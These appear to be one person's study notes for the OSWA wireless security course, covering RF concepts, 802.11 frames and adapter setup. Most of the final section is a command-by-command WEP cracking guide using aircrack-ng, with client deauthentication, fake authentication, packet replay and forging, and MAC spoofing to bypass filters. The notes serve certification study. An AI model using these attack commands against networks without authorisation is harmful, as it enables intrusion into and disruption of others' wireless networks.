# OSWA Notes by Optixal

## Contents
1. Introduction: Pg 4 - 20
2. RF Spectrum: Pg 23 - 45
3. Wireless Protocols, Equipment & Security: Pg 49 - 131

## 1. Introduction
* Chapter Pages: Pg 4 - 20
* 5E Attacker Methodology: Pg 13 - 20
---
### 5E Attacker Methodology

#### 1. Exploration
Reconnaissance. Find out info about the target : how many wireless networks? SSID? Location and coverage of the wireless networks? Private or Public network?
   
#### 2. Enumeration
Determine weaknesses in target network : Is encryption used? What kind of encryption? Are all APs using same encryption scheme? Any vulnerabilities in encryption implementation (eg weak passphrases), how many active clients connected and/or generating traffic? Do active clients have wireless profiles other than profile for the target? Is proximity access possible or must use range extenders?

#### 3. Exploitation
Attempt to penetrate or disrupt target using weaknesses found during enumeration. Run specialized exploitation tools against wireless network or client. Run DoS tools to increase chance of successful exploit.
   
A wireless audit would end after this stage. Companies would not want you to do embedding and egress!

#### 4. Embedding
Seek to retain access to network (eg Trojan/rootkit/backdoor installation)

#### 5. Egress
Pull out of system – clean up evidence that attacker has been there

## 2. RF Spectrum
* Chapter Pages: Pg 23 - 45
* Calculating Wavelength of Frequency: Pg 24
* Calculating Sensitivity of Signal Strength with Power: Pg 29
* Calculating Attenuation and Free-Space Loss: Pg 32
* RF Spectrum Analysis: Pg 39
* SOIL: Pg 42
---
### Concepts

#### Isotrophic Radiator
Hypothetical antenna that radiates equally in all directions (perfect sphere)

#### Gain
How much signal favoured in a certain direction. The greater the gain, the more compressed into a donut shape it is. So a high gain of 14dBi pumps out a signal further than a 4dBi antenna but has a narrower beamwidth, so more accuracy is required in positioning it.

#### Transmission Range and Reception Range
Impacted by antenna design (gain and reception sensitivity), IC processing algorithm (how efficient is it in interpreting a signal at a given strngth in a sea of noise), transmission power, attenuation (design, free-space/enclosed path loss, environmental), etc.

#### RF Spectrum Analysis
A spectrum analyzer graphically plots peak RF energy points for each frequency or band being measured:
* Red – Strong
* Yellow
* Light Blue
* Dark Blue – Weak

#### Sphere of Influence Limit (SOIL)
* Maximum SOIL (MAX-SOIL)
* Signal Reacquisition SOIL (SR-SOIL)

Once you get dropped (beyond MAX-SOIL range), you will have to get much closer to the AP before you can get a successful association (SR-SOIL)

### 2.4 GHz Frequency Table

| Channel | Frequency | Uses
|:-------:| ---------:| -------------------------------------
| 1       | 2.412 GHz | Often Used As Non-Overlapping Channel
| 2       | 2.417 GHz |
| 3       | 2.422 GHz |
| 4       | 2.427 GHz |
| 5       | 2.432 GHz |
| 6       | 2.437 GHz | Often Used As Non-Overlapping Channel
| 7       | 2.442 GHz |
| 8       | 2.447 GHz | Microwave (~2.45 GHz)
| 9       | 2.452 GHz |
| 10      | 2.457 GHz |
| 11      | 2.462 GHz | Often Used As Non-Overlapping Channel
| 12      | 2.467 GHz |
| 13      | 2.472 GHz |
| 14      | 2.484 GHz | Often Used As None-Overlapping Channel

* USA
Channels 1 - 11, the FCC has mandated only these channels as usable.
* Asia & Europe
Channels 1 - 13
* Japan
Channels 1 - 14

## 3. Wireless Protocols, Equipment & Security
* Chapter Pages: Pg 49 - 131
* 802.15 Bluetooth: Pg 51 - 59
* RFID: Pg 60 - 88
  * RFID Architecture - Tag Characteristics Summary Table: Pg 74
  * RFID Security - Info Mod & Item Theft Example: Pg 80 - 85
* 802.11 WiFi: Pg 89 - 131
  * Wireless Frame Architecture - Frame Layout and To/FromDS Table: Pg 126
---
### Concepts

#### Basic Service Set (BSS)
A group of 802.11 clients form a **Basic Service Set** (BSS).

#### Independent Basic Service Set (IBSS)
A network in ad hoc mode with wireless clients without an Access Point.

#### Infrastructure Mode
Wiresless clients talk to Access Point and not directly to each other.

#### Distribution System (DS)
The means by which Access Points talk to other Access Points to exchange frames for wireless clients in their respective BSSs, forward frames to follow wireless clients as they move from one BSS to another, and exchange frames with a wired network.

#### Basic Service Set ID (BSSID)
MAC address of Access Point radio component. Some Access Points use different MAC addresses for their radio component and the wired Ethernet port. (The MAC addresses are likely to be sequential).

#### Extended Service Set
A set of infrastructure BSSes whose APs communicate among themselves.

#### Extended Service Set ID (ESSID) or SSID

#### Association/Disassociation
Connecting and disconnecting from an AP as the client enters and leaves its RF sphere of influence.

#### Roaming
Act of disassociating from one AP and associating with another AP within the same Extended Service Set.

#### SSID broadcasting
AP shows its SSID in frame beacons.

#### Wireless NICs and Chipsets
When doing wireless auditing, the chipset is important. Brand doesn’t matter. Need a chipset that is supported natively under Linux.

##### Modes:
* Ad-Hoc Mode
* Managed Mode
* Monitor Mode : WNIC operates in RFMON mode. For sniffing frames.
* Master Mode : WNIC operates as AP. Useful for testing wireless client security

### Commands for Setting Up Wifi Adapter

#### Command to Find Out Wireless Chipset Info
* `airmon-ng`
* `dmesg | less`
* `lspci –vv | less` (for PCI cards)
* `lsusb –vv | less` (for USB)

#### Chipset Prefixes
* Ralink Chipsets - "rt"
* Realtek Chipsets - "rtl"
* Atheros Chipsets - "ar"

#### Find Out Supported Parameters for `iwpriv`
`iwpriv wlan0`

#### Setting Frequency Band of Wireless NIC
`iwpriv wlan0 mode 3`

* Mode 3 is for 802.11g
* Mode 2 is for 802.11b
* Mode 1 is for 802.11a

#### Commands For Changing Modes on Non-Atheros Chipsets:

* `ifconfig wlan0 down`
* `iwpriv wlan0 mode 3`, 3 for "G" band. Card may not support this, and may use this by default already.
* `ifconfig wlan0 up`
* `iwconfig wlan0 mode monitor` or `iwconfig wlan0 mode master`
* `iwconfig wlan0 channel [target]`

#### Commands For Changing Modes on Atheros Chipsets:

* `wlanconfig ath0 destroy`
* `wlanconfig ath0 create wlandev wifi0 wlanmode monitor` or `wlanconfig ath0 create wlandev wifi0 wlanmode master`
* `iwconfig wlan0 channel [target]`

#### Frame Injection
For Ralink chipsets, additional commands are required to enable frame injection:
1. `iwpriv wlan0 forceprism 1`
2. `iwpriv wlan0 rfmontx 1`

Visit http://linux-wless.passys.nl to check native Linux support for wireless chipsets.

#### Associate with an Open AP with SSID "oswa"
1. Connect with `iwconfig wlan0 essid oswa`, requires "Managed" mode.
2. Check if BSSID is listed with `iwconfig`.
3. If BSSID is not listed, do one of the following to get associated:
  * `ifconfig wlan0`
  * `pump -i wlan0`
  * `dhclient wlan0`
4. The channel should be auto-set when associating an AP. To set channel manually with `iwconfig wlan0 channel 6`.
5. To display more wireless info, use `iwlist wlan0 scanning`.

### Wireless Frame

#### Distribution System Bits
* ToDS
  * This bit is set to 1 when frame is addressed to AP for forwarding to DS (normally for data frames).
* FromDS
  * This bit is set to 1 when frame is coming from the DS
* Refer to Wireless Frame Architecture - Frame Layout and To/FromDS Table: Pg 126

#### Frame Control Header Types and Subtypes

| Type Value (b3 b2) | Type Description | Subtype Description | Subtype Value (b7 b6 b5 b4)
| ------------------ | ---------------- | ------------------- | ----------------------------
| 00 | Management Frames | Probe Request | 0100
| 00 | Management Frames | Probe Response | 0101
| 00 | Management Frames | Association Request | 0000
| 00 | Management Frames | Association Response | 0001
| 00 | Management Frames | Authentication | 1011
| 00 | Management Frames | Disassociation | 1010
| 00 | Management Frames | Deauthentication | 1100
| 00 | Management Frames | Beacon | 1000
| 00 | Management Frames | Reassociation Request | 0010
| 00 | Management Frames | Reassociation Response | 0011
| 01 | Control Frames | |
| 10 | Data Frames | |
| 11 | Reserverd Frames | |

##### Wireshark Filters
* To find beacon frames, filter by `wlan.fc.type_subtype == 0x08`.
* To find management frames, filter by `wlan.fc.type == 0x00`.
* To find control frames, filter by `wlan.fc.type == 0x01`.
* To find data frames, filter by `wlan.fc.type == 0x02`.
* To find ToDS frames, filter by `wlan.fc.tods == 1`.
* To find FromDS frames, filter by `wlan.fc.fromds == 1`.
* To find custom DS frames, filter by `wlan.fc.ds == 0x00`, where `00` is the DS signature.

##### How a Client Associates with an AP
1. Client sends **Probe Request** to AP.
2. AP sends **Probe Response** back to client.
3. Client sends **Authentication** to AP (which isn't really authentication, nothing to do with WEP/WPA encryption yet).
   1. If WEP, AP sends **Challenge Text** (in clear) to client.
   2. If WEP, client sends **Challenge Response** (encrypted with WEP key) back to AP.
4. AP sends **Authentication** back to client. If WEP, includes success/failure of challenge.
5. Client sends **Association Request** to AP.
6. AP sends **Association Response** back to client.
7. Data frame exchange.

## 4. Wireless Security Testing - Infrastructure
* Important Topic/Concept: Pg x - x
---
### Concepts

#### Wireless Sniffers
* Kismet
* Airodump-ng

#### 802.11i
802.11i covers wireless security.

#### WEP Types
* WEP 40-bit Key (5 bytes)
* WEP 104-bit Key (13 bytes) (uses RC4)

#### WPA Types
* WPA-PSK
* WPA Enterprise

#### WPA2 Types
* WPA2-PSK (WPA2 uses CCMP instead of TKIP)
* WPA2 Enterprise

### Cracking

#### WEP Cracking

##### Prep Chipsets (Monitor Mode and Frame Injection)
* Set Wifi adapters to monitor mode by referring to "Commands For Changing Modes on Chipsets" in previous chapter.
* Don't forget, for Ralink chipsets, additional commands are required to enable frame injection:
  1. `iwpriv wlan0 forceprism 1`
  2. `iwpriv wlan0 rfmontx 1`

##### Test Injection and Quality
`aireplay-ng --test [interface]`

##### Getting IVs PCAP

###### Workbook Method (With associated victim)

* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* (Terminal 2) Deauths client to force the client to reconnect and make an ARP request.  
`aireplay-ng --deauth 500 -a [MAC of AP] -c [Client's MAC] [interface]`

* (Terminal 3) Captures ARP requests and replays them to generate more ARP traffic. Do with previous.  
`aireplay-ng --arpreplay -b [MAC of AP] -h [Client's MAC] [interface]`

* (Terminal 1) Write out pcap file with captured ARP data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 1 (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* (Terminal 1 ) Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
`aireplay-ng --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* (Terminal 3) Captures ARP requests and replays them to generate more ARP traffic. Do with previous.  
`aireplay-ng --arpreplay -b [MAC of AP] -h [Our/Client's MAC] [interface]`

* (Terminal 1) Write out pcap file with captured ARP data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 2 - Interactive Replay Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* (Terminal 3) Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with previous.  
`aireplay-ng --interactive -b [MAC of AP] -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h [Our/Client's MAC] [interface]`

* (Terminal 1) Write out pcap file with captured data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 3 - PRGA Packetforge Interactive Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* (Terminal 3) Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a `.xor` file in current dir. Reply 'y' when prompted to reinject. May require few attempts with different packets, better with FromDS: 1. Do with previous.  
`aireplay-ng --fragment -b [MAC of AP] -h [Our/Client's MAC] [interface]`  
`aireplay-ng --chopchop -b [MAC of AP] -h [Our/Client's MAC] [interface]`

* (Terminal 3) 
`packetforge-ng --arp -a [MAC of AP] -h [Our/Client's MAC] -l 255.255.255.255 -k 255.255.255.255 -y [.xor PRGA File] -w [filename]`

* (Terminal 3)
`aireplay-ng --interactive -r [filename from prev step] [interface]`

* (Terminal 1) Write out pcap file with captured data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### *Changing MAC Address (Required when AP uses MAC filtering)

* Backup old MAC address (first 6 bytes of HWaddr)  
`ifconfig [interface]`

* Change MAC with one of the following  
  `ifconfig [interface] hw ether [xx:xx:xx:xx:xx:xx]` (may not work on all Linux distributions, doesn't work on OSWA Assistant.)
  * For Non-Atheros Chipsets:
    1. `ifconfig [interface] down`
    2. `ip link set [interface] address [xx:xx:xx:xx:xx:xx]`
    3. `iwconfig [interface] mode monitor`
    4. `ifconfig [interface] up`
  * For Atheros Chipsets:
    1. `ifconfig [interface] down`
    2. `ip link set [interface] address [xx:xx:xx:xx:xx:xx]`
    3. `ip link set wifi0 address [xx:xx:xx:xx:xx:xx]`
    4. `wlanconfig [interface] destroy`
    5. `wlanconfig [interface] create wlandev wifi0 wlanmode monitor`
    6. `ifconfig [interface] up`

* Verify that MAC address has been changed  
`ifconfig [interface]`

##### Crack Password With IV Data
`aircrack-ng -a 1 -b [MAC of AP] [filename of PCAP file being captured]` (Will require 40k+ data frames with IVs for 104-bit WEP keys)
